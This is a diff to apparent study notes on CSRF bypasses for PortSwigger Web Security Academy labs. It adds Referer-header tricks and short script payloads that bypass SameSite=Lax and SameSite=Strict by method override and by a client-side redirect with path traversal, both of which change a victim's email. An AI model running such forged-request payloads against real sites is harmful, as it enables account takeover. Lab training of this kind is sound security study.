@@ -113,4 +113,42 @@
 
   https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
 
-### SameSite:
+### Headers
+
+```
+<meta name="referrer" content="no-referrer">  //in head section
+
+Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net  //in head section
+
+history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
+
+Referrer-Policy: unsafe-url  //in head section
+
+### SameSite (if does not contains unpredictible tokens):
+```
+
+#### 1) SameSite=Lax:
+
+  Send the POST /my-account/change-email request to Burp Repeater.
+  Change request method.
+  Try overriding the method by adding the _method parameter:
+  ```
+  <script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
+  </script>
+  ```
+
+#### 2) SameSite=Strict:
+
+  ```
+  <script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+  </script>
+  ```
+  https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
+  
+#### 3) Other :
+
+  https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
+
+  https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
